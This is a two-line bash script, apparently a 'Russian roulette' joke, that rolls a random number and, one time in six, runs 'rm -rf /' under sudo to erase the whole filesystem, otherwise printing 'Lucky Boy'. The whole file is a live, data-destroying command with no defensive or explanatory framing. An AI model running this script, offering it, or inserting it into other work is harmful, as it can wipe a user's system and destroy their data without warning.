#!/bin/bash
sudo [ $[ $RANDOM % 6] == 0 ] && rm -rf / || echo "Lucky Boy";
